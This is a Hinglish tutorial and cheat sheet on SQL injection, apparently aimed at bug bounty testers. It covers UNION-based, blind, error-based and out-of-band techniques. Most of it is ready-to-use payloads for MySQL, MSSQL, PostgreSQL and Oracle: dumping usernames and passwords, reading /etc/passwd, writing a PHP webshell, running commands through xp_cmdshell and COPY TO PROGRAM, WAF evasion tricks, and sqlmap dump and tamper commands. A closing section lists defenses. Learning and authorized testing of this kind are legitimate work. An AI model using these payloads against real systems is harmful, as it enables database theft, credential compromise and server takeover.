1. SQLi Basics — Types & UNION kya hai

SQL Injection tab hoti hai jab application user input ko directly SQL query mein concatenate kar deta hai, bina sanitize/parameterize kiye. Attacker input ke through query ki structure hi badal deta hai.

SQLi ke Main Types

TypeKaam kaise karta hai
In-band (UNION-based)Response mein hi extra data dikh jata hai — same channel se result milta hai
In-band (Error-based)DB error messages mein data leak hota hai
Blind (Boolean-based)True/False response se guess karte hain (page change hoti hai ya nahi)
Blind (Time-based)SLEEP()/WAITFOR se response delay measure karte hain
Out-of-bandDNS/HTTP request ke through data exfiltrate hota hai (jab in-band possible na ho)
UNION operator do SELECT statements ke results ko combine karta hai. UNION-based SQLi mein attacker apna khud ka SELECT statement inject karta hai vulnerable query ke saath, taaki attacker-controlled data application ke normal output ke saath display ho jaye.

Requirement: UNION kaam tabhi karega jab dono queries ke columns ki count same ho aur data types compatible hon.

2. Injection Points Kaha Milte Hain

1
URL Parameters — ?id=1, ?product=5, ?category=shoes
2
Search / Filter boxes — search query backend mein LIKE query bana rahi hoti hai
3
Login forms — username/password fields
4
HTTP Headers — User-Agent, Referer, X-Forwarded-For (kai apps inhe log/query karti hain)
5
Cookies — session ya tracking cookies jo DB lookup mein use hote hain
6
JSON/API body parameters — REST API POST requests
Burp Suite se pura traffic intercept karo aur har parameter ko systematically test karo — Proxy → Intercept → Send to Repeater workflow use karo.

3. Step-by-Step UNION Methodology

1
Confirm karo ki SQLi hai
id=1'
id=1"
id=1`
id=1)
id=1--
Agar error aata hai ya behavior change hota hai → likely injectable
2
Column count nikalo (ORDER BY se) — detail Section 4 mein
3
Confirm karo UNION accept ho raha hai
' UNION SELECT NULL,NULL,NULL--+
NULL isliye use karte hain kyunki ye har data type ke saath compatible hota hai
4
Reflecting column find karo — kaunsa column output mein visible hai
' UNION SELECT 1,2,3--+
Jo number page pe dikhega, wahi column data extraction ke liye use hoga
5
Database info gather karo
' UNION SELECT database(),user(),version()--+
6
Table & column names enumerate karo — Section 6 mein detail
7
Actual data extract karo (usernames, hashes, emails etc.)

4. Column Count Find Karna

Method A: ORDER BY

' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
' ORDER BY 4--+   ← jab error aaye, iske pehle wala number = total columns

Method B: UNION SELECT NULL

' UNION SELECT NULL--+
' UNION SELECT NULL,NULL--+
' UNION SELECT NULL,NULL,NULL--+   ← jab error na aaye, ye sahi count hai
Note: Kabhi kabhi error suppress ho jata hai (custom error pages ke wajah se). Aise case mein response length/behavior compare karo Burp Comparer se.

5. Database-wise Advanced Payloads

MySQL

-- DB fingerprint
' UNION SELECT @@version,2,3--+

-- All databases
' UNION SELECT schema_name,2,3 FROM information_schema.schemata--+

-- All tables of current DB
' UNION SELECT table_name,2,3 FROM information_schema.tables 
  WHERE table_schema=database()--+

-- All columns of a specific table
' UNION SELECT column_name,2,3 FROM information_schema.columns 
  WHERE table_name='users'--+

-- Dump data (multiple columns in one via concat)
' UNION SELECT username,password,3 FROM users--+

-- Concat multiple fields in single column (jab column kam hon)
' UNION SELECT CONCAT(username,0x3a,password),2,3 FROM users--+

-- File read (agar FILE privilege hai)
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--+

-- Write webshell (agar secure_file_priv allow kare)
' UNION SELECT '',2,3 
  INTO OUTFILE '/var/www/html/shell.php'--+

MSSQL

-- Version
' UNION SELECT @@version,2,3--+

-- Tables
' UNION SELECT table_name,2,3 FROM information_schema.tables--+

-- Columns
' UNION SELECT column_name,2,3 FROM information_schema.columns 
  WHERE table_name='users'--+

-- Stacked query (agar multi-statement allow ho)
'; EXEC xp_cmdshell('whoami')--+

-- Time-based confirm
'; WAITFOR DELAY '0:0:5'--+

PostgreSQL

-- Version
' UNION SELECT version(),2,3--+

-- Tables
' UNION SELECT table_name,2,3 FROM information_schema.tables 
  WHERE table_schema='public'--+

-- Command execution (agar superuser + extension enabled)
'; COPY (SELECT '') TO PROGRAM 'whoami'--+

Oracle

-- Oracle mein har SELECT ke saath FROM dual zaroori hai
' UNION SELECT banner,NULL FROM v$version--+

-- Tables
' UNION SELECT table_name,NULL FROM all_tables--+

-- Columns
' UNION SELECT column_name,NULL FROM all_tab_columns 
  WHERE table_name='USERS'--+

6. Data Extraction Techniques

Jab sirf 1 column reflect ho raha ho

' UNION SELECT CONCAT(username,'::',password,'::',email) FROM users--+

Multiple rows ek response mein laana (GROUP_CONCAT)

' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR '
'),2,3 
  FROM users--+

Schema enumeration ek shot mein

' UNION SELECT GROUP_CONCAT(table_name),2,3 
  FROM information_schema.tables WHERE table_schema=database()--+

Limit/Offset se row-by-row extraction (jab GROUP_CONCAT truncate ho jaye)

' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 0--+
' UNION SELECT username,password,3 FROM users LIMIT 1 OFFSET 1--+

UNION+SELECT filteredUNI/**/ON SEL/**/ECT, case mixing UnIoN sElEcT
Quotes filteredHex encoding: 0x61646d696e instead of 'admin'
Comments filtered (--)Use # (MySQL) ya balance parentheses instead

WAF bypass sirf authorized scope ke andar hi try karo — agar target ka WAF bypass karna scope se bahar hai to program rules dobara padho.

8. Blind vs Error vs UNION — Kab Kya Use Karna Hai

SituationTechnique
Response mein query ka output directly dikhta haiUNION-based
DB error verbose hai (stack trace visible)Error-based
Output kahi nahi dikhta, but page True/False jaisa behave karta haiBoolean-based blind
Kuch bhi visible nahi, response same rehta haiTime-based blind (SLEEP/WAITFOR)
Sab band hai, koi response difference nahiOut-of-band (DNS exfil)

Boolean-based test

' AND 1=1--+   (true condition — normal page)
' AND 1=2--+   (false condition — page different/empty)

Time-based test

' AND SLEEP(5)--+                 -- MySQL
'; WAITFOR DELAY '0:0:5'--+       -- MSSQL
' AND pg_sleep(5)--+              -- PostgreSQL

9. sqlmap Automation

Manual confirm karne ke baad sqlmap se automate karo — tumhare GitHub repo mein already commands hain, yaha UNION-specific advanced flags:

# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch

# Force UNION technique only
sqlmap -u "https://target.com/page?id=1" --technique=U --batch

# Column count already pata hai to specify karo (fast)
sqlmap -u "https://target.com/page?id=1" --union-cols=3 --technique=U

# Specific char for UNION test
sqlmap -u "https://target.com/page?id=1" --union-char=NULL

# Databases enumerate
sqlmap -u "https://target.com/page?id=1" --dbs

# Tables of a DB
sqlmap -u "https://target.com/page?id=1" -D dbname --tables

# Columns of a table
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --columns

# Dump data
sqlmap -u "https://target.com/page?id=1" -D dbname -T users -C username,password --dump

# Cookie-based injection
sqlmap -u "https://target.com/page" --cookie="session=abc123*" --batch

# POST body injection (from Burp saved request)
sqlmap -r request.txt --batch --technique=U

# WAF/Tamper scripts for evasion
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,charencode --random-agent

10. Defense / Prevention Developer Side

Bug reports likhte waqt remediation section mein ye suggest karna professional dikhta hai:

1
Parameterized Queries / Prepared Statements use karo — user input kabhi query string mein directly concatenate na ho
2
ORM (Object-Relational Mapping) frameworks use karo jo automatically escape karte hain
3
Least privilege — DB user ko sirf zaroori permissions do (no FILE, no DROP)
4
Input validation — whitelist-based validation, expected data type enforce karo
5
WAF as an extra layer (primary defense nahi honi chahiye)
6
Error messages generic rakho — DB errors user ko show mat karo
